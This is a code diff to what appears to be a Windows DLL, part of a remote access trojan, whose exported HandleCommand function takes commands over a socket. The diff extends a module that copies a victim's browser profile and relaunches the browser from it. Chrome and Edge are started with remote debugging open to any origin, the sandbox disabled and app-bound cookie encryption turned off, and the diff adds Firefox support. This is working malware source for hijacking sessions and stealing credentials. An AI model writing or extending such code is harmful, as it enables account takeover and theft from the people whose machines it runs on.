@@ -1316,6 +1316,14 @@ static wstring get_app_path(const wstring& appName) {
 
 static wstring get_browser_profile_path(const wstring& browserName) {
     wchar_t szPath[MAX_PATH];
+
+    if (browserName == L"Mozilla Firefox") {
+        if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
+        wstring path = szPath;
+        path += L"\\Mozilla\\Firefox\\Profiles";
+        return path;
+    }
+
     if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
 
     wstring path = szPath;
@@ -1346,7 +1354,9 @@ static bool copy_recursive(const fs::path& src, const fs::path& dst) {
                 if (name == L"Cache" || name == L"Code Cache" || name == L"GPUCache" ||
                     name == L"Service Worker" || name == L"Media Cache" ||
                     name == L"WebStorage" || name == L"crash_reporter" ||
-                    name == L"GrShaderCache") continue;
+                    name == L"GrShaderCache" || name == L"cache2" ||
+                    name == L"startupCache" || name == L"thumbnails" ||
+                    name == L"jumpListCache" || name == L"shader-cache") continue;
 
                 if (!copy_recursive(path, dst / name)) return false;
             } else {
@@ -1435,7 +1445,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             wstring wRequestedPath = utf8_to_wstring(requestedPath);
 
             bool isBrowser = (wRequestedPath == L"Google Chrome" ||
-                              wRequestedPath == L"Microsoft Edge");
+                              wRequestedPath == L"Microsoft Edge" ||
+                              wRequestedPath == L"Mozilla Firefox");
 
             if (isBrowser) {
                 thread([wRequestedPath]() {
@@ -1445,6 +1456,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     wstring exeName;
                     if (wRequestedPath == L"Google Chrome") exeName = L"chrome.exe";
                     else if (wRequestedPath == L"Microsoft Edge") exeName = L"msedge.exe";
+                    else if (wRequestedPath == L"Mozilla Firefox") exeName = L"firefox.exe";
 
                     wstring exePath = get_app_path(exeName);
                     if (exePath.empty()) {
@@ -1483,10 +1495,18 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     if (hFind != INVALID_HANDLE_VALUE) {
                         do {
                             wstring name = findData.cFileName;
-                            if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
-                                (name == L"Default" || name.find(L"Profile ") == 0)) {
-                                profileDir = name;
-                                break;
+                            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                                if (wRequestedPath == L"Mozilla Firefox") {
+                                    if (name.find(L".default") != wstring::npos) {
+                                        profileDir = name;
+                                        break;
+                                    }
+                                } else {
+                                    if (name == L"Default" || name.find(L"Profile ") == 0) {
+                                        profileDir = name;
+                                        break;
+                                    }
+                                }
                             }
                         } while (FindNextFileW(hFind, &findData));
                         FindClose(hFind);
@@ -1494,38 +1514,43 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     send_status("Tarayıcı başlatılıyor...");
 
-                    // Modern Chromium tarayıcılar için görünürlüğü ve kararlılığı artıran bayraklar
-                    wstring args = L" --remote-debugging-port=9222"
-                                   L" --user-data-dir=\"" + profilePath + L"\""
-                                   L" --profile-directory=\"" + profileDir + L"\""
-                                   L" --no-sandbox"
-                                   L" --disable-gpu"
-                                   L" --window-size=1280,720"
-                                   L" --window-position=0,0"
-                                   L" --no-first-run"
-                                   L" --no-default-browser-check"
-                                   L" --disable-background-networking"
-                                   L" --disable-sync"
-                                   L" --disable-translate"
-                                   L" --metrics-recording-only"
-                                   L" --safebrowsing-disable-auto-update"
-                                   L" --disable-setuid-sandbox"
-                                   L" --disable-infobars"
-                                   L" --disable-gpu-compositing"
-                                   L" --force-cpu-draw"
-                                   L" --disable-features=AppBoundEncryption,AppBoundEncryptionRequired,LockProfile,CalculateNativeWinOcclusion,RendererCodeIntegrity"
-                                   L" --password-store=basic"
-                                   L" --disable-encryption-win"
-                                   L" --restore-last-session"
-                                   L" --allow-profiles-outside-user-dir"
-                                   L" --no-pings"
-                                   L" --disable-notifications"
-                                   L" --disable-component-update"
-                                   L" --disable-blink-features=AutomationControlled"
-                                   L" --disable-backgrounding-occluded-windows"
-                                   L" --disable-renderer-backgrounding"
-                                   L" --remote-allow-origins=*"
-                                   L" --lang=en-US";
+                    wstring args;
+                    if (wRequestedPath == L"Mozilla Firefox") {
+                        args = L" -no-remote -profile \"" + profilePath + L"\\" + profileDir + L"\"";
+                    } else {
+                        // Modern Chromium tarayıcılar için görünürlüğü ve kararlılığı artıran bayraklar
+                        args = L" --remote-debugging-port=9222"
+                               L" --user-data-dir=\"" + profilePath + L"\""
+                               L" --profile-directory=\"" + profileDir + L"\""
+                               L" --no-sandbox"
+                               L" --disable-gpu"
+                               L" --window-size=1280,720"
+                               L" --window-position=0,0"
+                               L" --no-first-run"
+                               L" --no-default-browser-check"
+                               L" --disable-background-networking"
+                               L" --disable-sync"
+                               L" --disable-translate"
+                               L" --metrics-recording-only"
+                               L" --safebrowsing-disable-auto-update"
+                               L" --disable-setuid-sandbox"
+                               L" --disable-infobars"
+                               L" --disable-gpu-compositing"
+                               L" --force-cpu-draw"
+                               L" --disable-features=AppBoundEncryption,AppBoundEncryptionRequired,LockProfile,CalculateNativeWinOcclusion,RendererCodeIntegrity"
+                               L" --password-store=basic"
+                               L" --disable-encryption-win"
+                               L" --restore-last-session"
+                               L" --allow-profiles-outside-user-dir"
+                               L" --no-pings"
+                               L" --disable-notifications"
+                               L" --disable-component-update"
+                               L" --disable-blink-features=AutomationControlled"
+                               L" --disable-backgrounding-occluded-windows"
+                               L" --disable-renderer-backgrounding"
+                               L" --remote-allow-origins=*"
+                               L" --lang=en-US";
+                    }
 
                     wstring fullCmd = L"\"" + exePath + L"\"" + args;
                     vector<wchar_t> cmdLine(fullCmd.begin(), fullCmd.end());
